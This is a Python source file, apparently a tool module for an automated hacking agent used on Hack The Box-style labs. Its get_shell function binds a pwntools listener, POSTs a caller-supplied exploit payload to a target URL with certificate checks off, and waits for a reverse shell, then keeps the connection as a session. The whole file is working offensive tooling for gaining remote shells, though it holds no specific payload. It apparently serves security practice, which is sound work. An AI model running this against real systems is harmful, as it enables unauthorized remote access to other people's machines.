"""Skill: get_shell — start listener, deliver exploit, wait for reverse shell callback."""

from __future__ import annotations

import sys
import threading
import types
import uuid


def _sessions() -> dict:
    key = "_athena_htb_shell_sessions"
    if key not in sys.modules:
        m = types.ModuleType(key)
        m.data = {}
        sys.modules[key] = m
    return sys.modules[key].data  # type: ignore[attr-defined]


def get_shell(
    lhost: str,
    lport: int,
    exploit_url: str,
    exploit_body: str,
    exploit_headers: dict | None = None,
    timeout: int = 30,
) -> dict:
    try:
        from pwn import listen  # type: ignore[import]
    except ImportError:
        return {"error": "pwntools not installed — run: pip install pwntools", "connected": False}

    try:
        listener = listen(lport, bindaddr=lhost, timeout=timeout)
    except Exception as e:
        return {"error": f"Could not bind listener on {lhost}:{lport}: {e}", "connected": False}

    def _deliver():
        import httpx
        try:
            httpx.post(
                exploit_url,
                content=exploit_body.encode(),
                headers=exploit_headers or {},
                timeout=10.0,
                verify=False,
            )
        except Exception:
            pass

    t = threading.Thread(target=_deliver, daemon=True)
    t.start()

    try:
        conn = listener.wait_for_connection()
    except Exception as e:
        return {"error": f"No callback received within {timeout}s: {e}", "connected": False}

    session_id = uuid.uuid4().hex[:12]
    _sessions()[session_id] = conn
    return {"session_id": session_id, "connected": True}
